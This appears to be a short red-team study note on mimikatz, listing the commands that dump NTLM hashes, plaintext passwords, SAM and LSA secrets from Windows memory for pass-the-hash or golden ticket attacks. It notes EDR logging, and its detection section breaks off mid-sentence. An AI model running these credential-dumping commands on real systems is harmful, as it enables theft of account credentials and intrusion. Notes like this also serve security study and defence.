---
tags:
  - tool
  - linux
  - windows
  - AD
  - redteam
date: 2023-09-1
---

- Be aware that mimikatz will obtain handles to sensitive resources which can be logged and audited easily by [[EDR (Endpoint Detection and Response)]].
- There are lots of different versions of mimikatz.
- Built into [[Cobalt Strike]].
# Getting [[NTLM]] Hashes

1. `mimikatz.exe`
2. Make sure you get "20 OK" when running `Privilege::debug`
3. `sekurlsa::logonpasswords`: dumps the [[NTLM]] hash (If wdigest is enabled, you will be able to see the password in plaintext). You can use this to [[Pass The Hash]] or crack it with [[Hashcat]].
4. `LSAdump::sam /patch` sometimes will dump the SAM.
5. `lsadump::lsa /patch` LSA = local security authority (This is needed for [[Golden Ticket Attack]] attack)
# Detection

- This will open a read handle to LSASS which can be logged under